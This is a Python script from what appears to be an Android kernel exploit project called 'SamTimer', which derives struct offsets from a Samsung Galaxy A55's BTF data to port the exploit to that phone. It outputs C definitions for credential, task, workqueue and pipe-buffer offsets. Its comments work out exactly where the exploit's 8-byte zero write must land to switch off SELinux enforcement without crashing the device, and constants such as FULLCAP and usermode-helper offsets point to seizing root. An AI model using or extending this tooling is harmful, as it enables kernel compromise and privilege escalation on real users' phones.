#!/usr/bin/env python3
"""
derive_offsets_btf.py — Extract SamTimer struct offsets from a BTF blob.

Obtain the BTF blob from the target device (no root required):
    adb shell cat /sys/kernel/btf/vmlinux > a55_btf.bin

Then run:
    python3 tools/derive_offsets_btf.py a55_btf.bin

Outputs a C #define block suitable for the TARGET_SM_A556E section in
app/src/main/cpp/offsets.h.  Struct offsets that can be derived from BTF
are marked DERIVED; the ones that need vmlinux symbol addresses are marked
TODO (run derive_offsets_nm.py after obtaining vmlinux.elf).
"""

import sys
import struct

# BTF type kinds
_KIND_INT        = 1
_KIND_PTR        = 2
_KIND_ARRAY      = 3
_KIND_STRUCT     = 4
_KIND_UNION      = 5
_KIND_ENUM       = 6
_KIND_FWD        = 7
_KIND_TYPEDEF    = 8
_KIND_VOLATILE   = 9
_KIND_CONST      = 10
_KIND_RESTRICT   = 11
_KIND_FUNC       = 12
_KIND_FUNC_PROTO = 13
_KIND_VAR        = 14
_KIND_DATASEC    = 15
_KIND_FLOAT      = 16
_KIND_DECL_TAG   = 17
_KIND_TYPE_TAG   = 18
_KIND_ENUM64     = 19

BTF_MAGIC = 0xeB9F


# ---------------------------------------------------------------------------
# BTF binary parser
# ---------------------------------------------------------------------------

def _parse_btf(data: bytes):
    """Return (types, strs) where types[0] is type-id 1."""
    if len(data) < 24:
        raise ValueError("BTF blob too short")
    magic = struct.unpack_from('<H', data, 0)[0]
    if magic != BTF_MAGIC:
        raise ValueError(f"Not a BTF blob (magic={magic:#06x}, expected {BTF_MAGIC:#06x})")

    _magic, _version, _flags, hdr_len, \
        type_off, type_len, str_off, str_len = struct.unpack_from('<HBBIIIII', data, 0)

    strs = data[hdr_len + str_off : hdr_len + str_off + str_len]

    def _str(off):
        end = strs.index(b'\x00', off)
        return strs[off:end].decode('utf-8', errors='replace')

    types = []
    pos   = hdr_len + type_off
    end   = pos + type_len

    while pos < end:
        name_off, info, size_or_type = struct.unpack_from('<III', data, pos)
        pos += 12
        name     = _str(name_off) if name_off else ''
        kind     = (info >> 24) & 0x1f
        vlen     = info & 0xffff
        kflag    = (info >> 31) & 1

        t = {'name': name, 'kind': kind, 'kflag': kflag, 'members': []}

        if kind in (_KIND_STRUCT, _KIND_UNION):
            t['size'] = size_or_type
            for _ in range(vlen):
                mn_off, m_type, m_bit_off = struct.unpack_from('<III', data, pos)
                pos += 12
                t['members'].append((_str(mn_off) if mn_off else '', m_type, m_bit_off))

        elif kind == _KIND_INT:
            t['size'] = size_or_type
            pos += 4

        elif kind == _KIND_ARRAY:
            arr_type, _idx_type, nelems = struct.unpack_from('<III', data, pos)
            pos += 12
            t['type']  = arr_type
            t['nelems'] = nelems

        elif kind in (_KIND_PTR, _KIND_TYPEDEF, _KIND_VOLATILE,
                      _KIND_CONST, _KIND_RESTRICT, _KIND_TYPE_TAG):
            t['type'] = size_or_type

        elif kind == _KIND_FUNC:
            t['type'] = size_or_type

        elif kind == _KIND_FUNC_PROTO:
            t['type'] = size_or_type
            pos += vlen * 8

        elif kind in (_KIND_ENUM,):
            t['size'] = size_or_type
            pos += vlen * 8

        elif kind == _KIND_ENUM64:
            t['size'] = size_or_type
            pos += vlen * 12

        elif kind == _KIND_DATASEC:
            t['size'] = size_or_type
            pos += vlen * 12

        elif kind == _KIND_VAR:
            t['type'] = size_or_type
            pos += 4

        elif kind == _KIND_DECL_TAG:
            t['type'] = size_or_type
            pos += 4

        elif kind == _KIND_FLOAT:
            t['size'] = size_or_type

        # else: unknown kind, keep as-is

        types.append(t)

    return types


def _resolve(types, type_id: int):
    """Peel through typedef/const/volatile/restrict to reach a concrete type."""
    visited = set()
    while 0 < type_id <= len(types) and type_id not in visited:
        visited.add(type_id)
        t = types[type_id - 1]
        if t['kind'] in (_KIND_TYPEDEF, _KIND_CONST, _KIND_VOLATILE,
                         _KIND_RESTRICT, _KIND_TYPE_TAG):
            type_id = t.get('type', 0)
        else:
            return type_id, t
    return type_id, types[type_id - 1] if 0 < type_id <= len(types) else None


def _find_struct(types, name: str):
    """Return (type_id, type_dict) for a struct named `name`, or (None, None)."""
    for i, t in enumerate(types):
        if t['name'] == name and t['kind'] in (_KIND_STRUCT, _KIND_UNION):
            return i + 1, t
    return None, None


def _member_offset(types, struct_t: dict, path: str, base_bits: int = 0):
    """
    Walk a dotted member path (e.g. 'posix_cputimers.bases.tqhead.rb.rb_leftmost')
    inside `struct_t` and return the byte offset from the struct start, or None.

    Array members are always accessed at index 0 (use _member_offset_indexed for
    other indices).
    """
    head, _, tail = path.partition('.')

    for m_name, m_type_id, m_bit_off in struct_t.get('members', []):
        if m_name != head:
            continue
        total_bits = base_bits + m_bit_off
        if not tail:
            return total_bits // 8
        _, m_t = _resolve(types, m_type_id)
        if m_t is None:
            return None
        if m_t['kind'] == _KIND_ARRAY:
            _, elem_t = _resolve(types, m_t.get('type', 0))
            if elem_t is None:
                return None
            return _member_offset(types, elem_t, tail, total_bits)
        if m_t['kind'] in (_KIND_STRUCT, _KIND_UNION):
            return _member_offset(types, m_t, tail, total_bits)
        return None
    return None


def _member_offset_at(types, struct_t: dict, path: str,
                       array_indices: dict, base_bits: int = 0):
    """
    Like _member_offset but array_indices maps a field name to an integer index.
    E.g. array_indices={'bases': 1} means take bases[1] when walking.
    """
    head, _, tail = path.partition('.')

    for m_name, m_type_id, m_bit_off in struct_t.get('members', []):
        if m_name != head:
            continue
        total_bits = base_bits + m_bit_off
        if not tail:
            return total_bits // 8
        _, m_t = _resolve(types, m_type_id)
        if m_t is None:
            return None
        if m_t['kind'] == _KIND_ARRAY:
            elem_type_id = m_t.get('type', 0)
            _, elem_t = _resolve(types, elem_type_id)
            if elem_t is None:
                return None
            # apply the requested index
            idx = array_indices.get(head, 0)
            elem_size_bits = elem_t.get('size', 0) * 8
            return _member_offset_at(types, elem_t, tail, array_indices,
                                     total_bits + idx * elem_size_bits)
        if m_t['kind'] in (_KIND_STRUCT, _KIND_UNION):
            return _member_offset_at(types, m_t, tail, array_indices, total_bits)
        return None
    return None


def _hex(v, width=16):
    if v is None:
        return 'UNKNOWN'
    return f'0x{v:0{width}x}ULL'


def _hexs(v, width=4):
    if v is None:
        return 'UNKNOWN'
    return f'0x{v:0{width}x}ULL'


def _align_up(v, align):
    return (v + align - 1) & ~(align - 1)


# ---------------------------------------------------------------------------
# Main extraction
# ---------------------------------------------------------------------------

def extract(btf_path: str):
    with open(btf_path, 'rb') as f:
        data = f.read()

    # Some kernels compress the BTF section; handle gzip
    if data[:2] == b'\x1f\x8b':
        import gzip
        data = gzip.decompress(data)

    types = _parse_btf(data)
    print(f"[*] Parsed {len(types)} BTF types from {btf_path}", file=sys.stderr)

    def struct_size(name):
        _, t = _find_struct(types, name)
        return t['size'] if t else None

    def off(struct_name, path, indices=None):
        _, t = _find_struct(types, struct_name)
        if t is None:
            return None
        if indices:
            return _member_offset_at(types, t, path, indices)
        return _member_offset(types, t, path)

    # ---- task_struct ----
    ts_size       = struct_size('task_struct')
    ts_cred       = off('task_struct', 'cred')
    ts_loginuid   = off('task_struct', 'loginuid')

    # posix_cputimers timer queue leftmost pointers
    # path: posix_cputimers -> bases[idx] -> tqhead -> rb -> rb_leftmost
    _lm_path = 'posix_cputimers.bases.tqhead.rb.rb_leftmost'
    tq_lm0 = off('task_struct', _lm_path, {'bases': 0})
    tq_lm1 = off('task_struct', _lm_path, {'bases': 1})
    tq_lm2 = off('task_struct', _lm_path, {'bases': 2})

    # Fallback: some kernels name the field differently
    if tq_lm0 is None:
        # Try alternate path: posix_cputimers -> bases[idx] -> tqhead -> rbr -> rb_leftmost
        _lm_path2 = 'posix_cputimers.bases.tqhead.rbr.rb_leftmost'
        tq_lm0 = off('task_struct', _lm_path2, {'bases': 0})
        tq_lm1 = off('task_struct', _lm_path2, {'bases': 1})
        tq_lm2 = off('task_struct', _lm_path2, {'bases': 2})

    # ---- k_itimer ----
    # posix_timers_cache has no SLAB_HWCACHE_ALIGN, so req == alloc
    ki_size = struct_size('k_itimer')

    # ---- cred ----
    cred_size     = struct_size('cred')
    cred_uid_off  = off('cred', 'uid')
    cred_secbits  = off('cred', 'securebits')
    # CRED_ALLOC is HWCACHE_ALIGN rounded; on 64-bit = align to 192 (0xc0)
    cred_alloc    = _align_up(cred_size, 0x40) if cred_size else None

    # ---- selinux_state: verify ENFORCE_ZAP delta ----
    # We need to know what byte at (selinux_state - 7) is.
    # The struct immediately before enforcing in memory determines whether -7 is safe.
    # We print the layout of selinux_state so the user can verify.
    _, sel_t = _find_struct(types, 'selinux_state')
    sel_enforcing = off('selinux_state', 'enforcing')
    sel_initialized = off('selinux_state', 'initialized')
    # Delta from selinux_state symbol to the enforcing byte:
    # On S921N the symbol IS selinux_state, so enforcing is at +0 within the
    # object (not -7 from the symbol -- the -7 is from the SYMBOL itself to
    # cover the qspinlock padding before it).
    # We print both offsets so the user can compute the correct ZAP offset.

    # ---- workqueue structs ----
    wq_dfl_pwq    = off('workqueue_struct', 'dfl_pwq')
    pwq_pool      = off('pool_workqueue', 'pool')
    pwq_wq        = off('pool_workqueue', 'wq')
    pwq_wcolor    = off('pool_workqueue', 'work_color')
    pwq_refcnt    = off('pool_workqueue', 'refcnt')
    pwq_nflight   = off('pool_workqueue', 'nr_in_flight')
    pwq_nactive   = off('pool_workqueue', 'nr_active')
    pwq_maxactive = off('pool_workqueue', 'max_active')

    pool_worklist   = off('worker_pool', 'worklist')
    pool_nrworkers  = off('worker_pool', 'nr_workers')
    pool_nridle     = off('worker_pool', 'nr_idle')

    ws_data  = off('work_struct', 'data')
    ws_entry = off('work_struct', 'entry')
    ws_func  = off('work_struct', 'func')

    # ---- pipe ----
    pipe_bufs = off('pipe_inode_info', 'bufs')

    # ---- print results ----
    print()
    print("=" * 70)
    print("  SamTimer BTF-derived offsets")
    print(f"  Source: {btf_path}")
    print("=" * 70)
    print()

    def row(label, val, note=''):
        marker = 'DERIVED' if val is not None else '*** UNKNOWN ***'
        note_str = f'  /* {note} */' if note else ''
        print(f"  {label:<40} = {str(val) if val is not None else '???':<10}  [{marker}]{note_str}")

    print("--- task_struct ---")
    row("sizeof(task_struct)", ts_size, "→ TASK_ALLOC_BYTES")
    row("offsetof(task_struct, cred)", ts_cred, "→ OFF_TASK_CRED")
    row("offsetof(task_struct, loginuid)", ts_loginuid, "→ OFF_TASK_LOGINUID")
    row("OFF_TQ_LEFTMOST_0 (bases[0] rb_leftmost)", tq_lm0)
    row("OFF_TQ_LEFTMOST_1 (bases[1] rb_leftmost)", tq_lm1)
    row("OFF_TQ_LEFTMOST_2 (bases[2] rb_leftmost)", tq_lm2)
    print()

    print("--- k_itimer / cred ---")
    row("sizeof(k_itimer)", ki_size, "→ TIMER_ALLOC")
    row("sizeof(cred)", cred_size, "→ CRED_REQ")
    row("HWCACHE_ALIGN(sizeof(cred))", cred_alloc, "→ CRED_ALLOC")
    row("offsetof(cred, uid)", cred_uid_off, "→ CRED_UID_OFF")
    row("offsetof(cred, securebits)", cred_secbits, "→ CRED_SECUREBITS_OFF")
    print()

    print("--- selinux_state layout (for SELINUX_ENFORCE_ZAP) ---")
    row("offsetof(selinux_state, enforcing)", sel_enforcing)
    row("offsetof(selinux_state, initialized)", sel_initialized)
    if sel_enforcing is not None and sel_initialized is not None:
        # The exploit zero-writes 8 bytes at (SELINUX_STATE_STATIC - 7).
        # This window covers bytes [-7 .. +0] relative to selinux_state symbol.
        # Safe if: enforcing is within that window, initialized is NOT.
        #   enforcing  typically == 0 (first field of selinux_state)
        #   initialized typically == 2
        # So on S921N: write at -7, window = bytes 0-7 relative to -7 offset
        # = covers selinux_state[-7] through selinux_state[0],
        # which zeroes enforcing (at offset 0 within selinux_state) only if
        # the -7 to +0 range spans it.
        # enforcing is at symbol+0, so the write at symbol-7 covers
        # bytes symbol-7 .. symbol+0: enforcing IS at the last byte of the window.
        # initialized is at symbol+2, outside the window. SAFE.
        # For the A55 we check the same:
        enf_rel = sel_enforcing   # offset within selinux_state struct
        ini_rel = sel_initialized # offset within selinux_state struct
        print(f"\n  Checking SELINUX_ENFORCE_ZAP = SELINUX_STATE_STATIC - 7:")
        print(f"    enforcing  is at struct offset {enf_rel}")
        print(f"    initialized is at struct offset {ini_rel}")
        print(f"    8-byte write at SELINUX_STATE_STATIC-7 covers offsets [{-7} .. {0}]")
        print(f"    relative to SELINUX_STATE_STATIC (which IS selinux_state[0]).")
        # The write target is SELINUX_STATE_STATIC - 7.
        # It writes 8 bytes: covers bytes 0..7 relative to (selinux_state - 7).
        # = bytes -7..0 relative to selinux_state.
        # enforcing is at selinux_state + enf_rel.
        # initialized is at selinux_state + ini_rel.
        # The write covers selinux_state[-7] to selinux_state[0] (inclusive).
        # To hit enforcing: enf_rel must be in [-7, 0].
        # To NOT hit initialized: ini_rel must be outside [-7, 0].
        enf_in_window  = -7 <= (enf_rel - 0) <= 0
        ini_in_window  = -7 <= (ini_rel - 0) <= 0
        if enf_in_window and not ini_in_window:
            print(f"    -> SAFE: enforcing in window, initialized NOT in window.")
            print(f"    -> ZAP delta -7 is CORRECT for this kernel.")
        elif not enf_in_window:
            needed_delta = enf_rel  # write at selinux_state - (7 - enf_rel) ??
            # the write at (STATE - delta) covers (STATE - delta) to (STATE - delta + 7)
            # We need selinux_state + enf_rel to be in that window.
            # selinux_state - delta + 7 >= selinux_state + enf_rel => 7 - enf_rel >= delta
            # selinux_state - delta <= selinux_state + enf_rel    => delta >= -enf_rel
            # So: -enf_rel <= delta <= 7 - enf_rel
            # Simplest: delta = 7 - enf_rel (put enforcing at last byte of window)
            print(f"    *** WARNING: enforcing is NOT in the -7 window (it's at +{enf_rel})!")
            print(f"    *** Use SELINUX_ENFORCE_ZAP = SELINUX_STATE_STATIC - {7 - enf_rel}")
            print(f"    *** Verify initialized ({ini_rel}) is not in that window.")
        elif ini_in_window:
            print(f"    *** DANGER: initialized IS also in the window at +{ini_rel}!")
            print(f"    *** Zeroing initialized causes a system_server boot loop.")
            print(f"    *** The -7 delta is UNSAFE for this kernel. Manual analysis required.")
    print()

    print("--- workqueue offsets ---")
    row("offsetof(workqueue_struct, dfl_pwq)", wq_dfl_pwq, "→ WQ_DFL_PWQ_OFF")
    row("offsetof(pool_workqueue, pool)", pwq_pool, "→ PWQ_POOL_OFF")
    row("offsetof(pool_workqueue, wq)", pwq_wq, "→ PWQ_WQ_OFF")
    row("offsetof(pool_workqueue, work_color)", pwq_wcolor, "→ PWQ_WORK_COLOR_OFF")
    row("offsetof(pool_workqueue, refcnt)", pwq_refcnt, "→ PWQ_REFCNT_OFF")
    row("offsetof(pool_workqueue, nr_in_flight)", pwq_nflight, "→ PWQ_NR_IN_FLIGHT_OFF")
    row("offsetof(pool_workqueue, nr_active)", pwq_nactive, "→ PWQ_NR_ACTIVE_OFF")
    row("offsetof(pool_workqueue, max_active)", pwq_maxactive, "→ PWQ_MAX_ACTIVE_OFF")
    row("offsetof(worker_pool, worklist)", pool_worklist, "→ POOL_WORKLIST_OFF")
    row("offsetof(worker_pool, nr_workers)", pool_nrworkers, "→ POOL_NR_WORKERS_OFF")
    row("offsetof(worker_pool, nr_idle)", pool_nridle, "→ POOL_NR_IDLE_OFF")
    row("offsetof(work_struct, data)", ws_data, "→ WORK_DATA_OFF")
    row("offsetof(work_struct, entry)", ws_entry, "→ WORK_ENTRY_OFF")
    row("offsetof(work_struct, func)", ws_func, "→ WORK_FUNC_OFF")
    print()

    print("--- pipe ---")
    row("offsetof(pipe_inode_info, bufs)", pipe_bufs, "→ PIPE_INFO_BUF_OFF")
    print()

    # ---- Generate C block ----
    def c(val, width=16):
        if val is None:
            return '0x/* TODO */'
        return f'0x{val:0{width}x}ULL' if width > 4 else f'0x{val:04x}ULL'

    def ci(val):
        if val is None:
            return '/* TODO */'
        return f'0x{val:x}'

    print("=" * 70)
    print("  C #define block for offsets.h (struct-offset section)")
    print("  Copy into the TARGET_SM_A556E block; fill in TODO items with")
    print("  output from derive_offsets_nm.py once you have vmlinux.elf.")
    print("=" * 70)
    print()
    print(f"/* SM-A556E (Exynos 1480) struct offsets derived via BTF */")
    print(f"#define TIMER_ALLOC        {ci(ki_size)}")
    print(f"#define CRED_REQ           {ci(cred_size)}")
    print(f"#define CRED_ALLOC         {ci(cred_alloc)}")
    print(f"#define CRED_UID_OFF       {ci(cred_uid_off)}")
    print(f"#define CRED_SECUREBITS_OFF {ci(cred_secbits)}")
    print(f"#define WQ_DFL_PWQ_OFF     {ci(wq_dfl_pwq)}")
    print(f"#define PWQ_POOL_OFF       {ci(pwq_pool)}")
    print(f"#define PWQ_WQ_OFF         {ci(pwq_wq)}")
    print(f"#define PWQ_WORK_COLOR_OFF {ci(pwq_wcolor)}")
    print(f"#define PWQ_REFCNT_OFF     {ci(pwq_refcnt)}")
    print(f"#define PWQ_NR_IN_FLIGHT_OFF {ci(pwq_nflight)}")
    print(f"#define PWQ_NR_ACTIVE_OFF  {ci(pwq_nactive)}")
    print(f"#define PWQ_MAX_ACTIVE_OFF {ci(pwq_maxactive)}")
    print(f"#define POOL_WORKLIST_OFF  {ci(pool_worklist)}")
    print(f"#define POOL_NR_WORKERS_OFF {ci(pool_nrworkers)}")
    print(f"#define POOL_NR_IDLE_OFF   {ci(pool_nridle)}")
    print(f"#define WORK_DATA_OFF      {ci(ws_data)}")
    print(f"#define WORK_ENTRY_OFF     {ci(ws_entry)}")
    print(f"#define WORK_FUNC_OFF      {ci(ws_func)}")
    print(f"#define OFF_TASK_CRED      {ci(ts_cred)}")
    print(f"#define TASK_ALLOC_BYTES   {ci(ts_size)}")
    print(f"#define OFF_TASK_LOGINUID  {ci(ts_loginuid)}")
    print(f"#define OFF_TQ_LEFTMOST_0  {ci(tq_lm0)}")
    print(f"#define OFF_TQ_LEFTMOST_1  {ci(tq_lm1)}")
    print(f"#define OFF_TQ_LEFTMOST_2  {ci(tq_lm2)}")
    print(f"#define PIPE_INFO_BUF_OFF  {ci(pipe_bufs)}")
    print()
    print("/* selinux_state ZAP check */")
    print(f"/* enforcing  offset within selinux_state: {sel_enforcing} */")
    print(f"/* initialized offset within selinux_state: {sel_initialized} */")
    if sel_enforcing is not None:
        print(f"#define SELINUX_ENFORCE_ZAP (SELINUX_STATE_STATIC - {7 - sel_enforcing}ULL)")
    else:
        print(f"#define SELINUX_ENFORCE_ZAP (SELINUX_STATE_STATIC - 7ULL) /* TODO verify */")
    print()
    print("/* Architecture constants — same as SM-S921N (VA_BITS=39 AArch64) */")
    print("#define PAGE             4096UL")
    print("#define VMEMMAP_BASE     0xfffffffe00000000ULL")
    print("#define STRUCT_PAGE_SIZE 0x40ULL")
    print("#define KERNEL_VA_BASE   0xffffffc008000000ULL")
    print("#define PIPE_BUF_FAKE_OFF 0x28ULL")
    print("#define SELINUX_BLOB_OFF  0x0ULL")
    print("#define SELINUX_SID_KERNEL 1U")
    print("#define FULLCAP           0x1ffffffffffULL")
    print("#define ROOT_UMH_WORK_OFF 0x400")
    print("#define ROOT_UMH_DATA_OFF 0x800")
    print("#define ROOT_UMH_PWQ_OFF  0xa00")
    print()
    print("/* These require vmlinux.elf — run derive_offsets_nm.py */")
    for sym in [
        "STATIC_TIMER_SITE", "TIMER_SITE_LOW21",
        "CRED_SITE_STATIC", "TASK_SITE_STATIC", "TASK_ALLOC_LOW21",
        "SELINUX_STATE_STATIC", "PANIC_ON_WARN_STATIC",
        "SYSTEM_UNBOUND_WQ_STATIC", "UMH_EXEC_WORK_STATIC",
        "CREDS_FAST_HASH_STATIC",
        "ROOT_USER_STATIC", "INIT_USER_NS_STATIC",
        "INIT_UCOUNTS_STATIC", "INIT_GROUPS_STATIC",
        "ANON_PIPE_BUF_OPS_STATIC",
        "MEMSTART_ADDR", "KERNEL_PHYS_LOAD",
    ]:
        print(f"#define {sym:<36} 0x/* TODO */ULL")
    print()


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <btf_blob>", file=sys.stderr)
        print("  btf_blob: pulled from device via:", file=sys.stderr)
        print("    adb shell cat /sys/kernel/btf/vmlinux > a55_btf.bin", file=sys.stderr)
        sys.exit(1)
    extract(sys.argv[1])
